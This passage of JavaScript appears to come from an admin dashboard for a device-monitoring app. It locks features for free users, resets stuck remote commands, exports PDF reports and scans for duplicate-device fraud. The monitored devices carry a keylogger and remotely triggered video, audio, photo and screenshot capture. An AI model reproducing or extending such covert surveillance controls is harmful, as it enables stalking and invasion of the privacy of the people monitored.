    const maxLineWidth = pageWidth - (margin * 2);
    let y = 20;

    // Header
    const timestamp = new Date().toLocaleString();
    doc.setFontSize(18);
    doc.setTextColor(155, 89, 182); // Purple color
    doc.text('GHOST ACCOUNTS REPORT', margin, y);
    y += 10;
    
    doc.setFontSize(10);
    doc.setTextColor(100, 100, 100);
    doc.text(`Generated: ${timestamp}`, margin, y);
    y += 5;
    doc.text(`Total Ghost Accounts: ${currentGhostAccounts.length}`, margin, y);
    y += 10;

    // Separator line
    doc.setDrawColor(155, 89, 182);
    doc.setLineWidth(0.5);
    doc.line(margin, y, pageWidth - margin, y);
    y += 10;

    // Table Header
    doc.setFontSize(10);
    doc.setTextColor(0, 0, 0);
    doc.setFont(undefined, 'bold');
    doc.text('S.No', margin, y);
    doc.text('UID', margin + 15, y);
    doc.text('Email Verified', margin + 120, y);
    doc.text('Type', margin + 155, y);
    y += 5;
    
    doc.setDrawColor(200, 200, 200);
    doc.line(margin, y, pageWidth - margin, y);
    y += 7;

    // Table Content
    doc.setFont(undefined, 'normal');
    doc.setFontSize(8);

    currentGhostAccounts.forEach((ghost, index) => {
        // Check if we need a new page
        if (y > pageHeight - 30) {
            doc.addPage();
            y = 20;
            
            // Add header on new page
            doc.setFontSize(10);
            doc.setFont(undefined, 'bold');
            doc.text('S.No', margin, y);
            doc.text('UID', margin + 15, y);
            doc.text('Email Verified', margin + 120, y);
            doc.text('Type', margin + 155, y);
            y += 5;
            doc.line(margin, y, pageWidth - margin, y);
            y += 7;
            doc.setFont(undefined, 'normal');
            doc.setFontSize(8);
        }

        // Serial Number
        doc.text(`${index + 1}`, margin, y);
        
        // UID (truncate if too long)
        const uidText = ghost.uid.length > 30 ? ghost.uid.substring(0, 27) + '...' : ghost.uid;
        doc.text(uidText, margin + 15, y);
        
        // Email Verified Status
        const verifiedText = ghost.emailVerified ? 'Yes' : 'No';
        doc.setTextColor(ghost.emailVerified ? 39 : 231, ghost.emailVerified ? 174 : 76, ghost.emailVerified ? 96 : 60);
        doc.text(verifiedText, margin + 125, y);
        
        // Type
        doc.setTextColor(0, 0, 0);
        const typeText = ghost.type === 'profile_only' ? 'Profile Only' : 'Notification Only';
        doc.text(typeText, margin + 155, y);
        
        y += 6;
    });

    // Footer
    y += 10;
    if (y > pageHeight - 20) {
        doc.addPage();
        y = 20;
    }
    doc.setDrawColor(155, 89, 182);
    doc.line(margin, y, pageWidth - margin, y);
    y += 7;
    doc.setFontSize(8);
    doc.setTextColor(100, 100, 100);
    doc.text('Note: These accounts have signed up but never installed the mobile app.', margin, y);
    y += 5;
    doc.text('They can be safely deleted to clean up the database.', margin, y);

    // Save PDF
    const filename = `Ghost_Accounts_${new Date().getTime()}.pdf`;
    doc.save(filename);
}

// ==========================================
// GLOBAL FREE USER LOCKS FEATURE
// ==========================================

if (blockFeaturesFreeUsersBtn) {
    blockFeaturesFreeUsersBtn.addEventListener('click', () => {
        // Reset modal state
        globalUnlockDateInput.value = '';
        globalLockSmsCheckbox.checked = false;
        globalLockCallsCheckbox.checked = false;
        globalLockNotificationsCheckbox.checked = false;
        globalLockKeyloggerCheckbox.checked = false;
        
        // Show modal
        globalFreeLocksModal.classList.add('visible');
    });
}

const closeGlobalLocksModal = () => {
    globalFreeLocksModal.classList.remove('visible');
};

if (globalFreeLocksModal) {
    const closeBtn = globalFreeLocksModal.querySelector('.modal-close-btn');
    const cancelBtn = globalFreeLocksModal.querySelector('.modal-close-btn-secondary');
    if (closeBtn) closeBtn.addEventListener('click', closeGlobalLocksModal);
    if (cancelBtn) cancelBtn.addEventListener('click', closeGlobalLocksModal);
}

async function handleGlobalLock(isLocking) {
    const features = [];
    if (globalLockSmsCheckbox.checked) features.push('sms');
    if (globalLockCallsCheckbox.checked) features.push('calls');
    if (globalLockNotificationsCheckbox.checked) features.push('notifications');
    if (globalLockKeyloggerCheckbox.checked) features.push('keylogger');

    if (features.length === 0) {
        alert("Please select at least one feature.");
        return;
    }

    let unlockTime = null;
    if (isLocking) {
        const dateVal = globalUnlockDateInput.value;
        if (!dateVal) {
            alert("Please select an Unlock Date & Time.");
            return;
        }
        unlockTime = new Date(dateVal).getTime();
        if (unlockTime <= Date.now()) {
            alert("Unlock time must be in the future.");
            return;
        }
    }

    const actionText = isLocking ? "BLOCK/LOCK" : "UNBLOCK/UNLOCK";
    if (!confirm(`⚠️ ARE YOU SURE?\n\nAction: ${actionText}\nFeatures: ${features.join(', ')}\nTarget: ALL FREE USERS\n\nThis will apply immediately to all users without a subscription.`)) {
        return;
    }

    // Indicate loading
    const btn = isLocking ? globalLockBtn : globalUnlockBtn;
    const ogText = btn.innerHTML;
    btn.innerHTML = 'Processing...';
    btn.disabled = true;

    try {
        const snapshot = await get(ref(db, 'user'));
        if (!snapshot.exists()) {
            alert("No users found.");
            return;
        }

        const users = snapshot.val();
        const updates = {};
        let processedUsers = 0;

        for (const uid of Object.keys(users)) {
            const userNode = users[uid];
            
            // NOTE: We do NOT skip the whole user if they have a subscription.
            // Instead, we check each device individually.
            // if (userNode.subscription) continue; <--- Removed Global Skip

             // Check children (devices)
             let userUpdated = false;
             Object.keys(userNode).forEach(deviceKey => {
                 // Skip known non-device keys
                 if (deviceKey === 'profile' || deviceKey === 'subscription' || deviceKey === 'config' || deviceKey === 'adminNotifications') return;
                 
                 // Ensure it is a valid object (Device Node)
                 if (typeof userNode[deviceKey] !== 'object') return;

                 const childNode = userNode[deviceKey];

                 // PROTECTION CHECK:
                 // 1. If Account has Root Subscription -> PROTECT ALL (Assume Family Plan/Admin Access)
                 if (userNode.subscription) return; 
                 // 2. If Child/Device has Subscription -> PROTECT THIS DEVICE
                 if (childNode.subscription) return;

                 const lockPath = `user/${uid}/${deviceKey}/lockedFeatures`;
                 
                 features.forEach(feat => {
                     // Create lock object exactly like Single User Lock
                     let lockData = null;
                     
                     if (isLocking) {
                         lockData = {
                             isLocked: true,
                             unlockTime: Number(unlockTime) // Ensure numeric
                         };
                     } else {
                         lockData = {
                             isLocked: false,
                             unlockTime: 0
                         };
                     }

                     updates[`${lockPath}/${feat}`] = lockData;
                 });
                 userUpdated = true;
             });
             
             if (userUpdated) processedUsers++;
        }

        if (Object.keys(updates).length > 0) {
            await update(ref(db), updates);
            alert(`Succesfully ${isLocking ? 'LOCKED' : 'UNLOCKED'} features for ${processedUsers} Free Users.`);
            closeGlobalLocksModal();
        } else {
            alert("No updates needed or no free users found.");
        }

    } catch (e) {
        console.error("Global Lock Error:", e);
        alert("Error: " + e.message);
    } finally {
        btn.innerHTML = ogText;
        btn.disabled = false;
    }
}

if (globalUnlockBtn) globalUnlockBtn.addEventListener('click', () => handleGlobalLock(false));
if (globalLockBtn) globalLockBtn.addEventListener('click', () => handleGlobalLock(true));

// ==========================================
// 1. RESET LOCKS ONLY (Smart Locks & Features)
// ==========================================
const globalResetLocksBtn = document.getElementById('global-reset-locks-btn');
if (globalResetLocksBtn) {
    globalResetLocksBtn.addEventListener('click', async () => {
        if (!confirm("⚠️ RESET ALL LOCKS?\n\nThis will remove ALL:\n- Smart Blocks (24h Limit)\n- Feature Locks\n\nAre you sure you want to UNLOCK everyone?")) {
            return;
        }

        const originalText = globalResetLocksBtn.innerHTML;
        const descSpan = globalResetLocksBtn.querySelector('.desc');
        if(descSpan) {
            descSpan.innerText = 'Removing Locks...';
            globalResetLocksBtn.style.opacity = '0.7';
        }
        globalResetLocksBtn.disabled = true;

        try {
            const snapshot = await get(ref(db, 'user'));
            if (!snapshot.exists()) { alert("No users found."); return; }

            const users = snapshot.val();
            const updates = {};
            let count = 0;

            for (const uid of Object.keys(users)) {
                const userNode = users[uid];
                if (!userNode) continue;

                Object.keys(userNode).forEach(deviceKey => {
                    if (deviceKey === 'profile' || deviceKey === 'subscription' || deviceKey === 'config') return;
                    
                    // IF locks exist -> Remove them
                    if (userNode[deviceKey] && userNode[deviceKey].lockedFeatures) {
                        updates[`user/${uid}/${deviceKey}/lockedFeatures`] = null;
                        count++;
                    }
                });
            }

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ SUCCESS: Cleared locks from ${count} devices.`);
            } else {
                alert("No active locks found.");
            }

        } catch (error) {
            console.error(error);
            alert("Error: " + error.message);
        } finally {
            globalResetLocksBtn.innerHTML = originalText;
            globalResetLocksBtn.disabled = false;
        }
    }); 
}

// ==========================================
/* ======================================================== */
/*   RESET STUCK MEDIA COMMANDS (Global)                 */
/* ======================================================== */

const globalResetStuckCommandsBtn = document.getElementById('global-reset-stuck-commands-btn');

if (globalResetStuckCommandsBtn) {
    globalResetStuckCommandsBtn.addEventListener('click', async () => {
        if (!confirm("⚠️ RESET MEDIA COMMANDS? \n\nThis will scan ALL users for 'stuck' commands:\n- Video\n- Audio\n- Photo\n- Screenshot\n\nIt will force them to STOP (set to null/false).\n\nProceed?")) {
            return;
        }

        const originalText = globalResetStuckCommandsBtn.innerHTML;
        const descSpan = globalResetStuckCommandsBtn.querySelector('.desc');
        
        if (descSpan) {
            descSpan.innerText = 'Scanning DB...';
            globalResetStuckCommandsBtn.style.opacity = '0.7';
        }
        globalResetStuckCommandsBtn.disabled = true;

        try {
            // 1. Fetch ALL Users
            const snapshot = await get(ref(db, 'user'));
            if (!snapshot.exists()) {
                alert("Database is empty.");
                return;
            }

            const users = snapshot.val();
            const updates = {};
            let affectedUsers = new Set();
            let totalStuckCount = 0;

            // 2. Iterate & Detect
            for (const uid of Object.keys(users)) {
                const userNode = users[uid];
                if (!userNode) continue;

                Object.keys(userNode).forEach(deviceKey => {
                    // Skip known metadata keys
                    if (deviceKey === 'profile' || deviceKey === 'subscription' || deviceKey === 'config') return;
                    
                    const deviceData = userNode[deviceKey];
                    if (typeof deviceData !== 'object') return;

                    const basePath = `user/${uid}/${deviceKey}`;
                    let deviceHit = false;

                    // CHECK 1: Video (recordVideo: true)
                    if (deviceData.video && deviceData.video.params && deviceData.video.params.recordVideo === true) {
                        updates[`${basePath}/video/params`] = null; // Clear params to stop
                        deviceHit = true;
                        totalStuckCount++;
                    }

                    // CHECK 2: Audio (recordAudio: true)
                    if (deviceData.audio && deviceData.audio.params && deviceData.audio.params.recordAudio === true) {
                         updates[`${basePath}/audio/params`] = null;
                         deviceHit = true;
                         totalStuckCount++;
                    }

                    // CHECK 3: Photo (capturePhoto: true)
                    // Note: script.js sends { capturePhoto: true, ... }
                    if (deviceData.photo && deviceData.photo.params && deviceData.photo.params.capturePhoto === true) {
                        updates[`${basePath}/photo/params`] = null;
                        deviceHit = true;
                        totalStuckCount++;
                    }

                    // CHECK 4: Screenshot (value = true)
                    // Note: script.js sends just 'true' to screenshot/params
                    if (deviceData.screenshot && deviceData.screenshot.params === true) {
                        updates[`${basePath}/screenshot/params`] = null;
                        deviceHit = true;
                        totalStuckCount++;
                    }

                    if (deviceHit) {
                        affectedUsers.add(uid); // Count unique users "gurjaro"
                    }
                });
            }

            // 3. Execute Updates
            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ SUCCESS: Commands Reset!\n\n- Found ${totalStuckCount} stuck commands.\n- Affected Users (Gurjaro): ${affectedUsers.size}\n\nAll forced to stop.`);
            } else {
                alert("✨ Great! No stuck media commands found in the entire database.");
            }

        } catch (error) {
            console.error("Reset Commands Error:", error);
            alert("Error: " + error.message);
        } finally {
            globalResetStuckCommandsBtn.innerHTML = originalText;
            globalResetStuckCommandsBtn.disabled = false;
            globalResetStuckCommandsBtn.style.opacity = '1';
        }
    });
}

// 2. RESET NOTIFICATIONS ONLY (Renamed from Global Reset)
// ==========================================
if (globalResetAdminDataBtn) {
    globalResetAdminDataBtn.addEventListener('click', async () => {
        if (!confirm("⚠️ DELETE NOTIFICATIONS?\n\nThis will CLEAR:\n- All Admin Notifications sent to users.\n\n(Locks will remain active)\n\nProceed?")) {
            return;
        }

        const originalHtml = globalResetAdminDataBtn.innerHTML;
        const descSpan = globalResetAdminDataBtn.querySelector('.desc');
        if(descSpan) {
            descSpan.innerText = 'Deleting Alerts...';
            globalResetAdminDataBtn.style.opacity = '0.7';
        } else {
            globalResetAdminDataBtn.innerHTML = 'Scanning...';
        }
        globalResetAdminDataBtn.disabled = true;

        try {
            const snapshot = await get(ref(db, 'user'));
            if (!snapshot.exists()) {
                alert("No users found.");
                return;
            }

            const users = snapshot.val();
            const updates = {};
            let affectedDevices = 0;

            for (const uid of Object.keys(users)) {
                const userNode = users[uid];
                if (!userNode) continue;

                Object.keys(userNode).forEach(deviceKey => {
                    // Skip profile/subscription/config
                    if (deviceKey === 'profile' || deviceKey === 'subscription' || deviceKey === 'config') return;
                    if (typeof userNode[deviceKey] !== 'object') return;

                    const deviceNode = userNode[deviceKey];
                    const basePath = `user/${uid}/${deviceKey}`;

                    // Check if nodes exist before queuing delete (optional optimization, but good for reporting)
                    let hit = false;
                    if (deviceNode.adminNotifications) {
                        updates[`${basePath}/adminNotifications`] = null;
                        hit = true;
                    }
                    // REMOVED lockedFeatures DELETION FROM HERE
                    // if (deviceNode.lockedFeatures) {
                    //     updates[`${basePath}/lockedFeatures`] = null;
                    //     hit = true;
                    // }

                    if (hit) affectedDevices++;
                });
            }

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
                alert(`✅ SUCCESS: Notifications Cleared.\n\n- Cleared 'adminNotifications'\n- Affected Devices: ${affectedDevices}`);
            } else {
                alert("Scan complete. No notifications found.");
            }

        } catch (error) {
            console.error("Global Reset Error:", error);
            alert("Error: " + error.message);
        } finally {
            globalResetAdminDataBtn.innerHTML = originalHtml;
            globalResetAdminDataBtn.disabled = false;
        }
    });
}
/* ----------------------------------------------------- */
/*  ADMIN ACTIONS DROPDOWN LOGIC (Gear Menu)            */
/* ----------------------------------------------------- */

document.addEventListener('DOMContentLoaded', () => {
    const adminSettingsBtn = document.getElementById('admin-settings-trigger-btn');
    const adminMenu = document.getElementById('admin-actions-menu');
    const closeAdminMenuBtn = document.getElementById('close-admin-menu-btn');

    if (adminSettingsBtn && adminMenu) {
        // Toggle Menu
        adminSettingsBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            adminMenu.classList.toggle('active');
            adminSettingsBtn.classList.toggle('active');
        });

        // Close when clicking X button
        if(closeAdminMenuBtn) {
            closeAdminMenuBtn.addEventListener('click', () => {
                adminMenu.classList.remove('active');
                adminSettingsBtn.classList.remove('active');
            });
        }

        // Close when clicking outside
        document.addEventListener('click', (e) => {
            if (!adminMenu.contains(e.target) && !adminSettingsBtn.contains(e.target)) {
                adminMenu.classList.remove('active');
                adminSettingsBtn.classList.remove('active');
            }
        });
        
        // Close when a menu item is clicked (optional, but good UX)
        const menuItems = adminMenu.querySelectorAll('.menu-item-btn');
        menuItems.forEach(item => {
            item.addEventListener('click', () => {
                // We delay closing slightly so the user sees the click effect
                setTimeout(() => {
                   // adminMenu.classList.remove('active');
                   // adminSettingsBtn.classList.remove('active');
                   // OPTIONAL: Keep it open if they might do multiple actions? 
                   // Let's decide to keep it open for bulk admin work, or close it. 
                   // Usually for admin actions like 'clear logs', you might want to see the toaster.
                }, 200);
            });
        });
    }
});





/* ======================================================== */
/*   SYNC LEGACY ANDROID IDs LOGIC                          */
/* ======================================================== */
const syncLegacyUsersBtn = document.getElementById('sync-legacy-users-btn');
if (syncLegacyUsersBtn) {
    syncLegacyUsersBtn.addEventListener('click', async () => {
        if (!confirm("Sycning Legacy Android IDs!\n\nThis will scan ALL users' deviceStatus, decompress them, locate older Android IDs, and register them into Global_Device_Records.\n\nProceed?")) {
            return;
        }

        const btnTitle = syncLegacyUsersBtn.querySelector('.title');
        const originalText = btnTitle.innerHTML;
        btnTitle.innerHTML = 'Scanning...';
        syncLegacyUsersBtn.disabled = true;

        try {
            const usersSnapshot = await get(ref(db, 'user'));
            if (!usersSnapshot.exists()) {
                alert("No users found.");
                btnTitle.innerHTML = originalText;
                syncLegacyUsersBtn.disabled = false;
                return;
            }

            const usersData = usersSnapshot.val();
            const updates = {};
            let devicesFound = 0;
            let alreadyExistsSkipped = 0;

            // Pull existing Global Records to prevent overwriting
            const globalSnapshot = await get(ref(db, 'Global_Device_Records'));
            const globalData = globalSnapshot.exists() ? globalSnapshot.val() : {};

            Object.keys(usersData).forEach(uid => {
                const userNode = usersData[uid];
                if (!userNode || typeof userNode !== 'object') return;
                
                Object.keys(userNode).forEach(deviceKey => {
                    if (deviceKey === 'profile' || deviceKey === 'subscription' || deviceKey === 'config') return;
                    
                    const pChild = userNode[deviceKey];
                    if (pChild && pChild.deviceStatus) {
                        try {
                            const rawStatus = pChild.deviceStatus;
                            const decompressedStatus = decompressData(rawStatus);
                            
                            let statusObj = decompressedStatus;
                            if (typeof decompressedStatus === 'string') {
                                try {
                                    statusObj = JSON.parse(decompressedStatus);
                                } catch(e) {}
                            }

                            if (statusObj && statusObj.androidId) {
                                const androidId = statusObj.androidId;
                                
                                if (globalData[androidId] && globalData[androidId][uid]) {
                                    alreadyExistsSkipped++;
                                } else {
                                    updates[`Global_Device_Records/${androidId}/${uid}/timestamp`] = serverTimestamp();
                                    updates[`Global_Device_Records/${androidId}/${uid}/isLegacySync`] = true;
                                    devicesFound++;
                                }
                            }
                        } catch(e) {
                            console.warn("Could not process deviceStatus for", uid, deviceKey, e);
                        }
                    }
                });
            });

            if (Object.keys(updates).length > 0) {
               btnTitle.innerHTML = 'Updating DB...';
               await update(ref(db), updates);
               alert(`Legacy Sync Complete!\n\nSUCCESS: Synced ${devicesFound} older Android IDs to the global registry.\nSKIPPED: ${alreadyExistsSkipped} were already registered.`);
            } else {
               alert(`Scan complete. No missing legacy Android IDs needed updates.\n(Skipped ${alreadyExistsSkipped} already synchronized profiles).`);
            }

        } catch (err) {
            console.error(err);
            alert("Error syncing legacy IDs: " + err.message);
        } finally {
            btnTitle.innerHTML = originalText;
            syncLegacyUsersBtn.disabled = false;
        }
    });
}

/* ======================================================== */
/*   DUPLICATE DEVICE / FRAUD SCANNER LOGIC                 */
/* ======================================================== */

const duplicateDeviceScannerBtn = document.getElementById('duplicate-device-scanner-btn');
const fraudScannerModal = document.getElementById('fraud-scanner-modal');
const fraudScannerListArea = document.getElementById('fraud-scanner-list-area');
const fraudScannerRefreshBtn = document.getElementById('fraud-scanner-refresh-btn');
const fraudScannerPdfBtn = document.getElementById('fraud-scanner-pdf-btn');

let lastScannedFraudDevices = []; // To hold data for PDF

if (duplicateDeviceScannerBtn) {
    duplicateDeviceScannerBtn.addEventListener('click', () => {
        fraudScannerModal.style.display = 'flex';
        fraudScannerModal.style.opacity = '1';
        runFraudScanner();
    });
}

if (fraudScannerRefreshBtn) {
    fraudScannerRefreshBtn.addEventListener('click', () => {
        runFraudScanner();
    });
}

if (fraudScannerPdfBtn) {
    fraudScannerPdfBtn.addEventListener('click', () => {
        generateFraudListPDF(lastScannedFraudDevices);
    });
}

function generateFraudListPDF(devices) {
    if (!window.jspdf || !window.jspdf.jsPDF) {
        alert("PDF Library not loaded. Please refresh the page.");
        return;
    }
    if (!devices || devices.length === 0) {
        alert("No fraud devices to generate a document for.");
        return;
    }

    try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        
        let yPos = 20;
        
        doc.setFontSize(18);
        doc.setTextColor(231, 76, 60); // Red
        doc.text("Fraud/Duplicate Device Report", 14, yPos);
        yPos += 10;
        
        doc.setFontSize(12);
        doc.setTextColor(50, 50, 50);
        doc.text(`Total Offending Devices: ${devices.length}`, 14, yPos);
        yPos += 5;
        doc.text(`Generated on: ${new Date().toLocaleString()}`, 14, yPos);
        yPos += 15;

        devices.forEach((device, index) => {
            if(yPos > 270) {
                doc.addPage();
                yPos = 20;
            }
            
            doc.setFontSize(12);
            doc.setTextColor(0, 0, 0);
            doc.setFont('helvetica', 'bold');
            doc.text(`${index + 1}. Android ID: ${device.androidId}  (${device.totalCount} accounts)`, 14, yPos);
            yPos += 7;
            
            // Loop UIDs
            doc.setFontSize(10);
            doc.setFont('helvetica', 'normal');
            doc.setTextColor(80, 80, 80);
            device.uids.forEach((u, i) => {
                if(yPos > 280) { doc.addPage(); yPos = 20; }
                
                let marker = `Account ${i+1}:`;
                if(i === 0) marker = `Original Acc:`;
                else if(i === device.uids.length - 1) marker = `LATEST Bypass:`;
                
                doc.text(`  - ${marker} ${u.uid} (${u.dateStr})`, 14, yPos);
                yPos += 6;
            });
            yPos += 5; // space between devices
            doc.line(14, yPos-2, 196, yPos-2); // draw a line
            yPos += 5;
        });

        doc.save(`Fraud_Report_${new Date().getTime()}.pdf`);

    } catch(err) {
        alert("Error generating PDF: " + err.message);
    }
}

async function runFraudScanner() {
    if (!fraudScannerListArea) return;
    
    fraudScannerListArea.innerHTML = `<div style="text-align: center; color: #888; padding: 40px;">
        <i class="fas fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
        <br>Scanning Global Device Records...
    </div>`;

    try {
        const recordsSnapshot = await get(ref(db, 'Global_Device_Records'));
        if (!recordsSnapshot.exists()) {
            fraudScannerListArea.innerHTML = `<div style="text-align: center; color: #444; padding: 40px;">No Global Device Records found.</div>`;
            return;
        }

        const records = recordsSnapshot.val();
        let fraudulentDevices = [];

        // Iterate through all Android IDs
        for (const [androidId, uidsData] of Object.entries(records)) {
            const uidKeys = Object.keys(uidsData);
            
            // If an Android ID has more than 1 UID associated with it, flag it!
            if (uidKeys.length > 1) {
                
                let uidList = [];
                for(const [uid, data] of Object.entries(uidsData)) {
                    uidList.push({
                        uid: uid,
                        timestamp: data.timestamp || 0,
                        dateStr: data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown Time'
                    });
                }

                // Sort by oldest first, so we know who the "Original" user was
                uidList.sort((a, b) => a.timestamp - b.timestamp);

                fraudulentDevices.push({
                    androidId: androidId,
                    uids: uidList,
                    totalCount: uidList.length
                });
            }
        }

        // Sort completely by most abuse first (highest count)
        fraudulentDevices.sort((a, b) => b.totalCount - a.totalCount);
        
        lastScannedFraudDevices = fraudulentDevices; // Store for PDF

        renderFraudScannerUI(fraudulentDevices);

    } catch (error) {
        console.error("Fraud Scanner Error:", error);
        fraudScannerListArea.innerHTML = `<div style="text-align: center; color: #e74c3c; padding: 40px;">Error indexing records: ${error.message}</div>`;
    }
}

function renderFraudScannerUI(devices) {
    if (devices.length === 0) {
         fraudScannerListArea.innerHTML = `
            <div style="text-align: center; color: #2ecc71; padding: 40px; background: rgba(46, 204, 113, 0.1); border-radius: 8px;">
                <i class="fas fa-check-circle" style="font-size: 3rem; margin-bottom: 15px;"></i><br>
                <h3>All Clear!</h3>
                <p>No duplicate installations detected across standard accounts.</p>
            </div>`;
         return;
    }

    let html = `<div style="margin-bottom: 15px;">Found <b style="color:#e74c3c;">${devices.length}</b> devices exploiting multiple accounts.</div>`;
    html += `<div style="display: flex; gap: 15px; flex-direction: column;">`;

    devices.forEach((device, index) => {
        const primaryUid = device.uids[0]; // The oldest one
        const newestUid = device.uids[device.uids.length - 1]; // The latest abuser

        html += `
        <div style="background: #1a1a2e; border: 1px solid rgba(231, 76, 60, 0.3); border-radius: 8px; padding: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);">
            
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; margin-bottom: 10px;">
                <div>
                   <h4 style="margin: 0; color: #e74c3c;">Device #${index + 1} &nbsp;&nbsp;|&nbsp;&nbsp; ${device.totalCount} linked accounts</h4>
                   <span style="font-size: 0.8rem; color: #888; font-family: monospace;">ID: ${device.androidId}</span>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                
                <!-- ORIGINAL USER -->
                <div style="background: rgba(255,255,255,0.02); padding: 10px; border-radius: 5px; border-left: 3px solid #2ecc71;">
                    <div style="font-size: 0.75rem; color: #2ecc71; text-transform: uppercase; font-weight: bold; margin-bottom: 5px;">First Account (Original)</div>
                    <div style="font-size: 0.85rem; font-family: monospace; color: white;">UID: ${primaryUid.uid}</div>
                    <div style="font-size: 0.8rem; color: #aaa; margin-top: 3px;">Registered: ${primaryUid.dateStr}</div>
                </div>

                <!-- NEWEST ACCOUNT -->
                <div style="background: rgba(231, 76, 60, 0.05); padding: 10px; border-radius: 5px; border-left: 3px solid #e74c3c;">
                    <div style="font-size: 0.75rem; color: #e74c3c; text-transform: uppercase; font-weight: bold; margin-bottom: 5px;">Current Bypass Account</div>
                    <div style="font-size: 0.85rem; font-family: monospace; color: white;">UID: ${newestUid.uid}</div>
                    <div style="font-size: 0.8rem; color: #aaa; margin-top: 3px;">Registered: ${newestUid.dateStr}</div>
                </div>

            </div>

            <div style="margin-top: 15px; display: flex; gap: 10px; justify-content: flex-end;">
                <button onclick="fraudFreezeAbuser('${newestUid.uid}', this)" style="background: #e74c3c; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; transition: 0.2s;">
                    1-Click Freeze Current
                </button>
            </div>
            
            <!-- Hidden detail dropdown for all accounts if > 2 -->
            ${device.totalCount > 2 ? `
             <details style="margin-top: 10px; font-size: 0.8rem; color: #aaa;">
                <summary style="cursor: pointer; outline: none;">View all ${device.totalCount} generated UIDs</summary>
                <div style="padding: 10px; background: rgba(0,0,0,0.2); border-radius: 5px; margin-top: 5px;">
                    ${device.uids.map(u => `<div style="margin-bottom: 4px;">â€¢ ${u.uid} (<em>${u.dateStr}</em>)</div>`).join('')}
                </div>
            </details>
            ` : ''}

        </div>
        `;
    });

    html += `</div>`;
    fraudScannerListArea.innerHTML = html;
}

// Global window functions for the inline onclick handlers in the UI
window.fraudFreezeAbuser = async function(uid, btnElement) {
    if (!confirm("Are you sure you want to instantly freeze this specific abuser account? They will be locked out immediately.")) {
        return;
    }
    
    const originalText = btnElement.innerText;
    btnElement.innerText = "Freezing...";
    btnElement.disabled = true;
    btnElement.style.opacity = '0.5';

    try {
        // Find their first device child key to apply 'app_functioning' freeze
        const userSnapshot = await get(ref(db, `user/${uid}`));
        if (userSnapshot.exists()) {
             const userData = userSnapshot.val();
             
             // Update root profile node as standard
             const updates = {};
             updates[`user/${uid}/profile/accountStatus`] = 'frozen';
             
             // Update all child device roots to fully lock them
             Object.keys(userData).forEach(key => {
                 if (key === 'profile' || key === 'subscription' || key === 'config') return;
                 updates[`user/${uid}/${key}/app_functioning/isFrozen`] = true;
             });
             
             await update(ref(db), updates);
             
             btnElement.innerText = "FROZEN!";
             btnElement.style.background = "#2ecc71";
             btnElement.style.opacity = '1';
        } else {
             alert("User data not found in DB to freeze.");
             btnElement.innerText = originalText;
             btnElement.disabled = false;
             btnElement.style.opacity = '1';
        }
    } catch(err) {
        alert("Error freezing user: " + err.message);
        btnElement.innerText = originalText;
        btnElement.disabled = false;
        btnElement.style.opacity = '1';
    }
};

/* ======================================================== */
/*   SMART BLOCK MANAGER LOGIC (REFACTORED V2)           */
/* ======================================================== */

// Global State
let smartUsersList = [];
let currentSmartTab = 'blocked'; // 'blocked' | 'active'

// 1. OPEN MODAL & INIT
if (smartBlockBtn) {
    // Re-attach specific listener to handle new logic
    const newBtn = smartBlockBtn.cloneNode(true);
    smartBlockBtn.parentNode.replaceChild(newBtn, smartBlockBtn);
    
    newBtn.addEventListener('click', () => {
        const modal = document.getElementById('smart-block-modal');
        if(modal) {
             modal.style.display = 'flex';
             modal.style.opacity = '1';
             loadSmartBlockData();
        } else {
             alert('Smart Block Modal HTML not found.');
        }
    });

    // Close Modals
    document.querySelectorAll('.modal-close-smart-btn, .modal-close-smart-btn-secondary').forEach(btn => {
        btn.addEventListener('click', () => {
             const m = document.getElementById('smart-block-modal');
             if(m) m.style.display = 'none';
        });
    });
}

// 2. SETUP TABS & SEARCH
const tabBlockedBtn = document.getElementById('tab-blocked-btn');
const tabActiveBtn = document.getElementById('tab-active-btn');
const searchInput = document.getElementById('smart-search-input');
const bulkActionBtn = document.getElementById('smart-bulk-action-btn');
const selectAllVisible = document.getElementById('smart-select-all-visible');

if(tabBlockedBtn && tabActiveBtn) {
    tabBlockedBtn.addEventListener('click', () => switchSmartTab('blocked'));
    tabActiveBtn.addEventListener('click', () => switchSmartTab('active'));
}

if(searchInput) {
    searchInput.addEventListener('input', () => renderSmartUserList());
}

if(selectAllVisible) {
    selectAllVisible.addEventListener('change', (e) => {
        const checkboxes = document.querySelectorAll('.smart-user-checkbox');
        checkboxes.forEach(cb => cb.checked = e.target.checked);
        updateBulkButtonState();
    });
}

function switchSmartTab(tab) {
    currentSmartTab = tab;
    
    // Update UI
    if(tab === 'blocked') {
        tabBlockedBtn.classList.add('active');
        tabActiveBtn.classList.remove('active');
    } else {
        tabBlockedBtn.classList.remove('active');
        tabActiveBtn.classList.add('active');
    }
    
    renderSmartUserList();
}


// 3. LOAD DATA (Fetch & Store)
async function loadSmartBlockData() {
    const listContainer = document.getElementById('smart-list-container');
    if(!listContainer) return;

    listContainer.innerHTML = '<div style="text-align: center; padding: 40px; color: #64748b;"><div class="loader-spinner"></div><p>Scanning Database...</p></div>';
    
    smartUsersList = []; // Reset

    try {
        if(!auth.currentUser) await new Promise(r => setTimeout(r, 1000));
        
        // Use Index or REST (Existing Logic reused for efficiency)
        let uids = [];
        try {
            const indexSnap = await get(ref(db, 'All_Users_List'));
            if(indexSnap.exists()) uids = Object.keys(indexSnap.val());
        } catch(e) { console.log('Index failed', e); }

        if(uids.length === 0) {
            // Fallback
             const dbUrl = "https://home-demo12-d5814-default-rtdb.firebaseio.com"; 
             const token = await auth.currentUser.getIdToken();
             const response = await fetch(`${dbUrl}/user.json?shallow=true&auth=${token}`);
             if(response.ok) {
                 const data = await response.json();
                 if(data) uids = Object.keys(data);
             }
        }

        if(uids.length === 0) {
             listContainer.innerHTML = '<div style="text-align: center; padding: 20px;">No users found.</div>';
             return;
        }

